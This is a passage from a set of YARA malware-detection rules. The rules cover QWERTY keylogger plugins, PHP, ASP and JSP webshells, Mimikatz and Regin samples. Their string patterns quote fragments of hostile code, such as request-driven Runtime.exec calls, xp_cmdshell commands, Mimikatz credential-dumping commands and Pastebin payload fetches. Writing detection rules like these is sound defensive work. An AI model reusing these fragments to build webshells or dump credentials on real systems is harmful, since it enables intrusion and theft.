= \"FAILED to get Qwerty Status\" fullword wide\n      $s12 = \"- Successfully retrieved Log from Implant.\" fullword wide\n      $s13 = \"- Logging of all Windows is toggled ON\" fullword wide\n      $s14 = \"- Logging of all Windows is toggled OFF\" fullword wide\n      $s15 = \"Qwerty FAILED to retrieve window list.\" fullword wide\n      $s16 = \"- UNSUCCESSFUL Log Retrieval from Implant.\" fullword wide\n      $s17 = \"The implant failed to return a valid status\" fullword ascii\n      $s18 = \"- Log files were NOT generated!\" fullword wide\n      $s19 = \"Windows 2000/XP: Armenian. This is Unicode only.\" fullword wide\n      $s20 = \"- This machine is using a PS/2 Keyboard - Continue on using QWERTY\" fullword wide\n   condition: \n      10 of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20120_cmdDef_RID34DB : APT DEMO {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20120_cmdDef.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"This PPC gets the current keystroke log.\" fullword ascii\n      $s1 = \"This command will add the given WindowTitle to the list of Windows to log keys f\" ascii\n      $s2 = \"This command will remove the WindowTitle corresponding to the given window title\" ascii\n      $s3 = \"This command will return the current status of the Keyboard Logger (Whether it i\" ascii\n      $s4 = \"This command Toggles logging of all Keys. If allkeys is toggled all keystrokes w\" ascii\n      $s5 = \"<definition>Turn logging of all keys on|off</definition>\" fullword ascii\n      $s6 = \"<name>Get Keystroke Log</name>\" fullword ascii\n      $s7 = \"<description>Keystroke Logger Lp Plugin</description>\" fullword ascii\n      $s8 = \"<definition>display help for this function</definition>\" fullword ascii\n      $s9 = \"This command will switch ON Logging of keys. All keys taht are entered to a acti\" ascii\n      $s10 = \"Set the log limit (in number of windows)\" fullword ascii\n      $s11 = \"<example>qwgetlog</example>\" fullword ascii\n      $s12 = \"<aliasName>qwgetlog</aliasName>\" fullword ascii\n      $s13 = \"<definition>The title of the Window whose keys you wish to Log once it becomes a\" ascii\n      $s14 = \"This command will switch OFF Logging of keys. No keystrokes will be captured\" fullword ascii\n      $s15 = \"<definition>The title of the Window whose keys you no longer whish to log</defin\" ascii\n      $s16 = \"<command id=\\\"32\\\">\" fullword ascii\n      $s17 = \"<command id=\\\"3\\\">\" fullword ascii\n      $s18 = \"<command id=\\\"7\\\">\" fullword ascii\n      $s19 = \"<command id=\\\"1\\\">\" fullword ascii\n      $s20 = \"<command id=\\\"4\\\">\" fullword ascii\n   condition: \n      10 of them\n}\n\nrule FiveEyes_QUERTY_Malwareqwerty_20120_RID33A2 : APT DEMO {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20120.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 14:56:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<configFileName>20120_cmdDef.xml</configFileName>\" fullword ascii\n      $s1 = \"<name>20120.dll</name>\" fullword ascii\n      $s2 = \"<codebase>\\\"Reserved for future use.\\\"</codebase>\" fullword ascii\n      $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n      $s4 = \"<platform type=\\\"1\\\">\" fullword ascii\n      $s5 = \"</plugin>\" fullword ascii\n      $s6 = \"</pluginConfig>\" fullword ascii\n      $s7 = \"<pluginConfig>\" fullword ascii\n      $s8 = \"</platform>\" fullword ascii\n      $s9 = \"</lpConfig>\" fullword ascii\n      $s10 = \"<lpConfig>\" fullword ascii\n   condition: \n      all of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20121_cmdDef_RID34DC : APT DEMO {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20121_cmdDef.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:48:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<shortDescription>Keystroke Logger Plugin.</shortDescription>\" fullword ascii\n      $s1 = \"<message>Failed to get File Time</message>\" fullword ascii\n      $s2 = \"<description>Keystroke Logger Plugin.</description>\" fullword ascii\n      $s3 = \"<message>Failed to set File Time</message>\" fullword ascii\n      $s4 = \"</commands>\" fullword ascii\n      $s5 = \"<commands>\" fullword ascii\n      $s6 = \"</version>\" fullword ascii\n      $s7 = \"<associatedImplantId>20120</associatedImplantId>\" fullword ascii\n      $s8 = \"<message>No Comms. with Driver</message>\" fullword ascii\n      $s9 = \"</error>\" fullword ascii\n      $s10 = \"<message>Invalid File Size</message>\" fullword ascii\n      $s11 = \"<platforms>Windows (User/Win32)</platforms>\" fullword ascii\n      $s12 = \"<message>File Size Mismatch</message>\" fullword ascii\n      $s13 = \"<projectpath>plugin/Utility</projectpath>\" fullword ascii\n      $s14 = \"<pluginsDepend>None</pluginsDepend>\" fullword ascii\n      $s15 = \"<dllDepend>None</dllDepend>\" fullword ascii\n      $s16 = \"<pluginname>E_QwertyIM</pluginname>\" fullword ascii\n      $s17 = \"<rightsRequired>None</rightsRequired>\" fullword ascii\n      $s18 = \"<minorType>0</minorType>\" fullword ascii\n      $s19 = \"<code>00001002</code>\" fullword ascii\n      $s20 = \"<code>00001001</code>\" fullword ascii\n   condition: \n      12 of them\n}\n\nrule Pastebin_Webshell_RID2DDC : DEMO SCRIPT T1505_003 T1569_002 WEBSHELL {\n   meta:\n      description = \"Detects a web shell that downloads content from pastebin.com https://blog.sucuri.net/2015/01/website-backdoors-leverage-the-pastebin-service.html\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.sucuri.net/2015/01/website-backdoors-leverage-the-pastebin-service.html\"\n      date = \"2015-01-13 10:49:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"DEMO, SCRIPT, T1505_003, T1569_002, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"file_get_contents(\\\"http://pastebin.com\" ascii\n      $s1 = \"xcurl('http://pastebin.com/download.php\" ascii\n      $s2 = \"xcurl('http://pastebin.com/raw.php\" ascii\n      $x0 = \"if($content){unlink('evex.php');\" ascii\n      $x1 = \"$fh2 = fopen(\\\"evex.php\\\", 'a');\" ascii\n      $y0 = \"file_put_contents($pth\" ascii\n      $y1 = \"echo \\\"<login_ok>\" ascii\n      $y2 = \"str_replace('* @package Wordpress',$temp\" ascii\n   condition: \n      1 of ( $s* ) or all of ( $x* ) or all of ( $y* )\n}\n\nrule CoreImpact_sysdll_exe_RID2F93 : APT DEMO G0130 MIDDLE_EAST {\n   meta:\n      description = \"Detects a malware sysdll.exe from the Rocket Kitten APT\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-12-27 12:03:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"APT, DEMO, G0130, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"d:\\\\nightly\\\\sandbox_avg10_vc9_SP1_2011\\\\source\\\\avg10\\\\avg9_all_vs90\\\\bin\\\\Rele\" ascii\n      $s1 = \"Mozilla/5.0\" fullword ascii\n      $s3 = \"index.php?c=%s&r=%lx\" fullword ascii\n      $s4 = \"index.php?c=%s&r=%x\" fullword ascii\n      $s5 = \"127.0.0.1\" fullword ascii\n      $s6 = \"/info.dat\" ascii\n      $s7 = \"needroot\" fullword ascii\n      $s8 = \"./plugins/\" ascii\n   condition: \n      $s0 or 6 of them\n}\n\nrule Mimikatz_Memory_Rule_1_RID2FB6 : APT DEMO HKTL S0002 T1003 T1134_005 T1550_002 T1550_003 T1569_002 {\n   meta:\n      description = \"Detects password dumper mimikatz in memory (False Positives: an service that could have copied a Mimikatz executable, AV signatures)\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-12-22 12:08:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-07-04\"\n      tags = \"APT, DEMO, HKTL, S0002, T1003, T1134_005, T1550_002, T1550_003, T1569_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sekurlsa::wdigest\" fullword ascii\n      $s2 = \"sekurlsa::logonPasswords\" fullword ascii\n      $s3 = \"sekurlsa::minidump\" fullword ascii\n      $s4 = \"sekurlsa::credman\" fullword ascii\n      $fp1 = \"\\\"x_mitre_version\\\": \" ascii\n      $fp2 = \"{\\\"type\\\":\\\"bundle\\\",\" \n      $fp3 = \"use strict\" ascii fullword\n      $fp4 = \"\\\"url\\\":\\\"https://attack.mitre.org/\" ascii\n   condition: \n      1 of ( $s* ) and not 1 of ( $fp* )\n}\n\nrule SoakSoak_Infected_Wordpress_RID31D6 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a SoakSoak infected Wordpress site https://blog.sucuri.net/2014/12/soaksoak-malware-compromises-100000-wordpress-websites.html\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.sucuri.net/2014/12/soaksoak-malware-compromises-100000-wordpress-websites.html\"\n      date = \"2014-12-15 13:39:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"wp_enqueue_script(\\\"swfobject\\\");\" ascii fullword\n      $s1 = \"function FuncQueueObject()\" ascii fullword\n      $s2 = \"add_action(\\\"wp_enqueue_scripts\\\", 'FuncQueueObject');\" ascii fullword\n   condition: \n      all of ( $s* )\n}\n\nrule HawkEye_PHP_Panel_RID2D55 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects HawkEye Keyloggers PHP Panel\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-12-14 10:27:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$fname = $_GET['fname'];\" ascii fullword\n      $s1 = \"$data = $_GET['data'];\" ascii fullword\n      $s2 = \"unlink($fname);\" ascii fullword\n      $s3 = \"echo \\\"Success\\\";\" fullword ascii\n   condition: \n      all of ( $s* ) and filesize < 600\n}\n\nrule JSP_jfigueiredo_APT_webshell_RID31E3 : APT DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"JSP Browser used as web shell by APT groups - author: jfigueiredo\"\n      author = \"Florian Roth\"\n      reference = \"http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp\"\n      date = \"2014-12-10 13:41:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"String fhidden = new String(Base64.encodeBase64(path.getBytes()));\" ascii\n      $a2 = \"<form id=\\\"upload\\\" name=\\\"upload\\\" action=\\\"ServFMUpload\\\" method=\\\"POST\\\" enctype=\\\"multipart/form-data\\\">\" ascii\n   condition: \n      all of them\n}\n\nrule JSP_jfigueiredo_APT_webshell_2_RID3274 : APT DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"JSP Browser used as web shell by APT groups - author: jfigueiredo\"\n      author = \"Florian Roth\"\n      reference = \"http://ceso.googlecode.com/svn/web/bko/filemanager/\"\n      date = \"2014-12-10 14:05:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"<div id=\\\"bkorotator\\\"><img alt=\\\"\\\" src=\\\"images/rotator/1.jpg\\\"></div>\" ascii\n      $a2 = \"$(\\\"#dialog\\\").dialog(\\\"destroy\\\");\" ascii\n      $s1 = \"<form id=\\\"form\\\" action=\\\"ServFMUpload\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\">\" ascii\n      $s2 = \"<input type=\\\"hidden\\\" id=\\\"fhidden\\\" name=\\\"fhidden\\\" value=\\\"L3BkZi8=\\\" />\" ascii\n   condition: \n      all of ( $a* ) or all of ( $s* )\n}\n\nrule CN_Hacktool_MilkT_BAT_RID2EAC : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Detects a chinese Portscanner named MilkT - shipped BAT\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-12-10 11:24:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" ascii\n      $s1 = \"if not \\\"%Choice%\\\"==\\\"\\\" set Choice=%Choice:~0,1%\" ascii\n   condition: \n      all of them\n}\n\nrule Webshell_Insomnia_RID2DE4 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Insomnia Webshell - file InsomniaShell.aspx\"\n      author = \"Florian Roth\"\n      reference = \"http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/\"\n      date = \"2014-12-09 10:51:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Response.Write(\\\"- Failed to create named pipe:\\\");\" fullword ascii\n      $s1 = \"Response.Output.Write(\\\"+ Sending {0}<br>\\\", command);\" fullword ascii\n      $s2 = \"String command = \\\"exec master..xp_cmdshell 'dir > \\\\\\\\\\\\\\\\127.0.0.1\" ascii\n      $s3 = \"Response.Write(\\\"- Error Getting User Info<br>\\\");\" fullword ascii\n      $s4 = \"string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,\" fullword ascii\n      $s5 = \"[DllImport(\\\"Advapi32.dll\\\", SetLastError = true)]\" fullword ascii\n      $s9 = \"username = DumpAccountSid(tokUser.User.Sid);\" fullword ascii\n      $s14 = \"//Response.Output.Write(\\\"Opened process PID: {0} : {1}<br>\\\", p\" ascii\n   condition: \n      3 of them\n}\n\nrule OPCLEAVER_Parviz_Developer_RID3092 : APT DEMO G0003 {\n   meta:\n      description = \"Parviz developer known from Operation Cleaver\"\n      author = \"Florian Roth\"\n      reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n      date = \"2014-12-02 12:45:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, G0003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Users\\\\parviz\\\\documents\\\\\" nocase\n   condition: \n      $s1\n}\n\nrule OPCLEAVER_CCProxy_Config_RID2F6E : APT DEMO G0003 {\n   meta:\n      description = \"CCProxy config known from Operation Cleaver\"\n      author = \"Florian Roth\"\n      reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n      date = \"2014-12-02 11:56:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, G0003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"UserName=User-001\" fullword ascii\n      $s2 = \"Web=1\" fullword ascii\n      $s3 = \"Mail=1\" fullword ascii\n      $s4 = \"FTP=0\" fullword ascii\n      $x1 = \"IPAddressLow=78.109.194.114\" fullword ascii\n   condition: \n      all of ( $s* ) or $x1\n}\n\nrule Regin_Sample_3_RID2C59 : APT DEMO FILE T1543_003 {\n   meta:\n      description = \"Detects Regin Backdoor sample fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-27 09:45:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Service Pack x\" fullword wide\n      $s1 = \"\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\" wide\n      $s2 = \"\\\\REGISTRY\\\\Machine\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\HotFix\" wide\n      $s3 = \"mntoskrnl.exe\" fullword wide\n      $s4 = \"\\\\REGISTRY\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Memory Management\" wide\n      $s5 = \"Memory location: 0x%p, size 0x%08x\" wide fullword\n      $s6 = \"Service Pack\" fullword wide\n      $s7 = \".sys\" fullword wide\n      $s8 = \".dll\" fullword wide\n      $s10 = \"\\\\REGISTRY\\\\Machine\\\\Software\\\\Microsoft\\\\Updates\" wide\n      $s11 = \"IoGetRelatedDeviceObject\" fullword ascii\n      $s12 = \"VMEM.sys\" fullword ascii\n      $s13 = \"RtlGetVersion\" fullword wide\n      $s14 = \"ntkrnlpa.exe\" fullword ascii\n   condition: \n      uint32 ( 0 ) == 0xfedcbafe and all of ( $s* ) and filesize > 160KB and filesize < 200KB\n}\n\nrule Regin_sig_svcsstat_RID2E82 : APT DEMO FILE {\n   meta:\n      description = \"Detects svcstat from Regin report - file svcsstat.exe_sample\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-25 11:17:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Service Control Manager\" fullword ascii\n      $s1 = \"_vsnwprintf\" ascii\n      $s2 = \"Root Agency\" fullword ascii\n      $s3 = \"Root Agency0\" fullword ascii\n      $s4 = \"StartServiceCtrlDispatcherA\" fullword ascii\n      $s5 = \"\\\\\\\\?\\\\UNC\" fullword wide\n      $s6 = \"%ls%ls\" fullword wide\n   condition: \n      all of them and filesize < 15KB and filesize > 10KB\n}\n\nrule Regin_Sample_1_RID2C57 : APT DEMO T1136 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file-3665415_sys\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-25 09:45:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, T1136\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Getting PortName/Identifier failed - %x\" fullword ascii\n      $s1 = \"SerialAddDevice - error creating new devobj [%#08lx]\" fullword ascii\n      $s2 = \"External Naming Failed - Status %x\" fullword ascii\n      $s3 = \"------- Same multiport - different interrupts\" fullword ascii\n      $s4 = \"%x occurred prior to the wait - starting the\" fullword ascii\n      $s5 = \"'user registry info - userPortIndex: %d\" fullword ascii\n      $s6 = \"Could not report legacy device - %x\" fullword ascii\n      $s7 = \"entering SerialGetPortInfo\" fullword ascii\n      $s8 = \"'user registry info - userPort: %x\" fullword ascii\n      $s9 = \"IoOpenDeviceRegistryKey failed - %x \" fullword ascii\n      $s10 = \"Kernel debugger is using port at address %X\" fullword ascii\n      $s12 = \"Release - freeing multi context\" fullword ascii\n      $s13 = \"Serial driver will not load port\" fullword ascii\n      $s14 = \"'user registry info - userAddressSpace: %d\" fullword ascii\n      $s15 = \"SerialAddDevice: Enumeration request, returning NO_MORE_ENTRIES\" fullword ascii\n      $s20 = \"'user registry info - userIndexed: %d\" fullword ascii\n      $fp1 = \"Enter SerialBuildResourceList\" ascii fullword\n   condition: \n      all of them and filesize < 110KB and filesize > 80KB and not $fp1\n}\n\nrule Regin_Sample_2_RID2C58 : APT DEMO T1543_003 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file hiddenmod_hookdisk_and_kdbg_8949d000.bin\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-25 09:45:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\SYSTEMROOT\\\\system32\\\\lsass.exe\" wide\n      $s1 = \"atapi.sys\" fullword wide\n      $s2 = \"disk.sys\" fullword wide\n      $s3 = \"IoGetRelatedDeviceObject\" fullword ascii\n      $s4 = \"HAL.dll\" fullword ascii\n      $s5 = \"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\" ascii\n      $s6 = \"PsGetCurrentProcessId\" fullword ascii\n      $s7 = \"KeGetCurrentIrql\" fullword ascii\n      $s8 = \"\\\\REGISTRY\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\" wide\n      $s9 = \"KeSetImportanceDpc\" fullword ascii\n      $s10 = \"KeQueryPerformanceCounter\" fullword ascii\n      $s14 = \"KeInitializeEvent\" fullword ascii\n      $s15 = \"KeDelayExecutionThread\" fullword ascii\n      $s16 = \"KeInitializeTimerEx\" fullword ascii\n      $s18 = \"PsLookupProcessByProcessId\" fullword ascii\n      $s19 = \"ExReleaseFastMutexUnsafe\" fullword ascii\n      $s20 = \"ExAcquireFastMutexUnsafe\" fullword ascii\n   condition: \n      all of them and filesize < 40KB and filesize > 30KB\n}\n\nrule Regin_Sample_Set_2_RID2DE3 : APT DEMO T1543_003 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file SHF-000052 and ndisips.sys\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-25 10:51:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8487a961c8244004c9276979bb4b0c14392fc3b8\"\n      hash2 = \"bcf3461d67b39a427c83f9e39b9833cfec977c61\"\n      tags = \"APT, DEMO, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"HAL.dll\" fullword ascii\n      $s1 = \"IoGetDeviceObjectPointer\" fullword ascii\n      $s2 = \"MaximumPortsServiced\" fullword wide\n      $s3 = \"KeGetCurrentIrql\" fullword ascii\n      $s4 = \"ntkrnlpa.exe\" fullword ascii\n      $s5 = \"\\\\REGISTRY\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\" wide\n      $s6 = \"ConnectMultiplePorts\" fullword wide\n      $s7 = \"\\\\SYSTEMROOT\" wide\n      $s8 = \"IoWriteErrorLogEntry\" fullword ascii\n      $s9 = \"KeQueryPerformanceCounter\" fullword ascii\n      $s10 = \"KeServiceDescriptorTable\" fullword ascii\n      $s11 = \"KeRemoveEntryDeviceQueue\" fullword ascii\n      $s12 = \"SeSinglePrivilegeCheck\" fullword ascii\n      $s13 = \"KeInitializeEvent\" fullword ascii\n      $s14 = \"IoBuildDeviceIoControlRequest\" fullword ascii\n      $s15 = \"KeRemoveDeviceQueue\" fullword ascii\n      $s16 = \"IofCompleteRequest\" fullword ascii\n      $s17 = \"KeInitializeSpinLock\" fullword ascii\n      $s18 = \"MmIsNonPagedSystemAddressValid\" fullword ascii\n      $s19 = \"IoCreateDevice\" fullword ascii\n      $s20 = \"KefReleaseSpinLockFromDpcLevel\" fullword ascii\n   condition: \n      all of them and filesize < 40KB and filesize > 30KB\n}\n\nrule aspbackdoor_EDIT_RID2D1F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file EDIT.ASP\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:18:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<meta HTTP-EQUIV=\\\"Content-Type\\\" CONTENT=\\\"text/html;charset=gb_2312-80\\\">\" fullword ascii\n      $s2 = \"Set thisfile = fs.GetFile(whichfile)\" fullword ascii\n      $s3 = \"response.write \\\"<a href='index.asp'>\" fullword ascii\n      $s5 = \"if Request.Cookies(\\\"password\\\")=\\\"juchen\\\" then \" fullword ascii\n      $s6 = \"Set thisfile = fs.OpenTextFile(whichfile, 1, False)\" fullword ascii\n      $s7 = \"color: rgb(255,0,0); text-decoration: underline }\" fullword ascii\n      $s13 = \"if Request(\\\"creat\\\")<>\\\"yes\\\" then\" fullword ascii\n   condition: \n      5 of them\n}\n\nrule aspbackdoor_entice_RID2E71 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file entice.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 11:14:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<Form Name=\\\"FormPst\\\" Method=\\\"Post\\\" Action=\\\"entice.asp\\\">\" fullword ascii\n      $s2 = \"if left(trim(request(\\\"sqllanguage\\\")),6)=\\\"select\\\" then\" fullword ascii\n      $s4 = \"conndb.Execute(sqllanguage)\" fullword ascii\n      $s5 = \"<!--#include file=sqlconn.asp-->\" fullword ascii\n      $s6 = \"rstsql=\\\"select * from \\\"&rstable(\\\"table_name\\\")\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Webshell_sig_238_cmd_2_RID2F09 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file cmd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 11:40:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Process child = Runtime.getRuntime().exec(\" ascii\n      $s1 = \"InputStream in = child.getInputStream();\" fullword ascii\n      $s2 = \"String cmd = request.getParameter(\\\"\" ascii\n      $s3 = \"while ((c = in.read()) != -1) {\" fullword ascii\n      $s4 = \"<%@ page import=\\\"java.io.*\\\" %>\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Webshell_aspfile2_RID2DBC : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file aspfile2.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:44:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"response.write \\\"command completed success!\\\" \" fullword ascii\n      $s1 = \"for each co in foditems \" fullword ascii\n      $s3 = \"<input type=text name=text6 value=\\\"<%= szCMD6 %>\\\"><br> \" fullword ascii\n      $s19 = \"<title>Hello! Welcome </title>\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Webshell_aspbackdoor_EDIR_RID30B2 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file EDIR.ASP\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 12:50:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"response.write \\\"<a href='index.asp'>\" fullword ascii\n      $s3 = \"if Request.Cookies(\\\"password\\\")=\\\"\" ascii\n      $s6 = \"whichdir=server.mappath(Request(\\\"path\\\"))\" fullword ascii\n      $s7 = \"Set fs = CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n      $s19 = \"whichdir=Request(\\\"path\\\")\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Webshell_aspbackdoor_asp4_RID3106 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file asp4.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 